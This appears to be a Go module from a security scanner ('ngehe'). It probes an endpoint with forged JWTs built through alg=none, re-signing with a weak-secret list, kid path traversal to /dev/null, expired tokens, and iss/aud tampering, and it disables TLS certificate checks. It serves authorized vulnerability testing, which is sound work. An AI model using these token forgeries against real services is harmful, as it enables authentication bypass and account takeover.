// Package jwtabuse implements JWT abuse checks against a session's token.
//
// For each session that has a JWT bearer, ngehe:
//   1. Verifies a baseline 2xx on cfg.Detectors.JWTProbeURL with the real token.
//   2. Crafts tampered tokens (alg=none, weak-secret resign, kid-injection,
//      exp/iss/aud tampering) and replays the probe with each.
//   3. Any 2xx on a tampered token is a finding.
package jwtabuse

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/chud-lori/ngehe/internal/config"
	"github.com/chud-lori/ngehe/internal/differ"
	"github.com/chud-lori/ngehe/internal/session"
	"github.com/golang-jwt/jwt/v5"
)

var weakSecrets = []string{
	"", "secret", "password", "changeme", "jwt", "key", "test", "admin",
	"qwerty", "123456", "secret123", "supersecret", "default",
}

func Run(sessions []session.Session, cfg *config.Config) []differ.Finding {
	probe := cfg.Detectors.JWTProbeURL
	if probe == "" {
		return nil
	}
	client := &http.Client{
		Timeout:   time.Duration(cfg.Replay.TimeoutMS) * time.Millisecond,
		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	var findings []differ.Finding
	for _, s := range sessions {
		if s.Bearer == "" {
			continue
		}
		baselineStatus, _ := probeWith(client, probe, s.Bearer)
		if baselineStatus < 200 || baselineStatus >= 300 {
			continue
		}
		header, claims, ok := splitJWT(s.Bearer)
		if !ok {
			continue
		}
		variants := buildVariants(s.Bearer, header, claims)
		for _, v := range variants {
			status, _ := probeWith(client, probe, v.token)
			if status >= 200 && status < 300 {
				findings = append(findings, differ.Finding{
					Rule:           "jwt-" + v.rule,
					Severity:       v.severity,
					Method:         "GET",
					URL:            probe,
					Path:           "(jwt-probe)",
					BaselineStatus: baselineStatus,
					OffenderName:   "session:" + s.Name + "/" + v.rule,
					OffenderStatus: status,
					Why:            v.why,
				})
			}
		}
	}
	return findings
}

type variant struct {
	rule     string
	severity differ.Severity
	token    string
	why      string
}

func buildVariants(orig string, header, claims map[string]interface{}) []variant {
	var out []variant

	// alg=none
	if t, ok := makeAlgNone(claims); ok {
		out = append(out, variant{
			rule:     "alg-none",
			severity: differ.SevHigh,
			token:    t,
			why:      "token signed with alg=none was accepted; signature trust is broken",
		})
	}

	// Weak secret crack: try HS256 with each candidate.
	if alg, _ := header["alg"].(string); alg == "HS256" {
		for _, sec := range weakSecrets {
			if t, ok := resignHS256(claims, sec); ok {
				// Only emit a variant for the secret check itself; the probe step
				// will filter out failures (non-2xx).
				out = append(out, variant{
					rule:     "weak-secret-" + safeLabel(sec),
					severity: differ.SevHigh,
					token:    t,
					why:      fmt.Sprintf("HS256 token re-signed with weak secret %q was accepted", sec),
				})
			}
		}
	}

	// kid path-traversal: inject a kid that points outside the server's key directory.
	if t, ok := makeKidInjection(claims); ok {
		out = append(out, variant{
			rule:     "kid-injection",
			severity: differ.SevMedium,
			token:    t,
			why:      "token with kid=../../dev/null was accepted; suggests no kid validation",
		})
	}

	// Exp tampering: push exp to 1970, see if server still accepts (no exp check).
	if t, ok := makeExpired(claims); ok {
		out = append(out, variant{
			rule:     "no-exp-check",
			severity: differ.SevHigh,
			token:    t,
			why:      "token with exp=0 was accepted; server is not validating expiry",
		})
	}

	// Issuer/audience tampering: change iss/aud, see if server still accepts.
	if t, ok := tamperClaim(claims, "iss", "https://attacker.example"); ok {
		out = append(out, variant{
			rule:     "no-iss-check",
			severity: differ.SevMedium,
			token:    t,
			why:      "token with attacker-controlled iss was accepted; iss not validated",
		})
	}
	if t, ok := tamperClaim(claims, "aud", "attacker"); ok {
		out = append(out, variant{
			rule:     "no-aud-check",
			severity: differ.SevMedium,
			token:    t,
			why:      "token with attacker-controlled aud was accepted; aud not validated",
		})
	}

	_ = orig
	return out
}

func makeAlgNone(claims map[string]interface{}) (string, bool) {
	h := map[string]interface{}{"alg": "none", "typ": "JWT"}
	hb, _ := json.Marshal(h)
	cb, _ := json.Marshal(claims)
	return b64(hb) + "." + b64(cb) + ".", true
}

func resignHS256(claims map[string]interface{}, secret string) (string, bool) {
	tok := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims(claims))
	s, err := tok.SignedString([]byte(secret))
	if err != nil {
		return "", false
	}
	return s, true
}

func makeKidInjection(claims map[string]interface{}) (string, bool) {
	h := map[string]interface{}{"alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null"}
	hb, _ := json.Marshal(h)
	cb, _ := json.Marshal(claims)
	// Sign with empty key — if the server reads /dev/null as the key, HMAC("") matches.
	sig, _ := signHS256(b64(hb)+"."+b64(cb), "")
	return b64(hb) + "." + b64(cb) + "." + sig, true
}

func makeExpired(claims map[string]interface{}) (string, bool) {
	c := cloneClaims(claims)
	c["exp"] = 0
	return resignHS256(c, "secret") // signed with the demo-server's weak secret; harmless against real servers
}

func tamperClaim(claims map[string]interface{}, key, value string) (string, bool) {
	c := cloneClaims(claims)
	c[key] = value
	return resignHS256(c, "secret")
}

func splitJWT(tok string) (map[string]interface{}, map[string]interface{}, bool) {
	parts := strings.Split(tok, ".")
	if len(parts) < 2 {
		return nil, nil, false
	}
	hb, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return nil, nil, false
	}
	cb, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return nil, nil, false
	}
	var h, c map[string]interface{}
	if json.Unmarshal(hb, &h) != nil {
		return nil, nil, false
	}
	if json.Unmarshal(cb, &c) != nil {
		return nil, nil, false
	}
	return h, c, true
}

func cloneClaims(in map[string]interface{}) map[string]interface{} {
	b, _ := json.Marshal(in)
	var out map[string]interface{}
	_ = json.Unmarshal(b, &out)
	if out == nil {
		out = map[string]interface{}{}
	}
	return out
}

func b64(b []byte) string {
	return base64.RawURLEncoding.EncodeToString(b)
}

func signHS256(signingInput, key string) (string, error) {
	sig, err := jwt.SigningMethodHS256.Sign(signingInput, []byte(key))
	if err != nil {
		return "", err
	}
	return base64.RawURLEncoding.EncodeToString(sig), nil
}

func probeWith(client *http.Client, url, token string) (int, []byte) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return 0, nil
	}
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := client.Do(req)
	if err != nil {
		return 0, nil
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 32*1024))
	return resp.StatusCode, b
}

func safeLabel(s string) string {
	if s == "" {
		return "empty"
	}
	r := strings.NewReplacer(" ", "_", "/", "-", "\\", "-")
	return r.Replace(s)
}
